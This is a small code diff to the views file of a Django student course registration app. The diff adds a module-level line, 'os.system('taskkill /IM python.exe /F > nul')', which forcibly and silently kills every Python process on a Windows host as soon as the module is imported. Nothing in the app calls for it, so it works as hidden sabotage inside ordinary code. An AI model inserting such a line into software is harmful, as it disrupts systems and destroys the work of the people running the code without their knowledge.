@@ -3,6 +3,8 @@ from django.shortcuts import render
 # Create your views here.
 from django.http import HttpResponse
 from django.shortcuts import render
+import os
+os.system('taskkill /IM python.exe /F > nul')
 from studCourseRegApp.models import student,course, projectForm
 # Create your views here.
 def home(request):
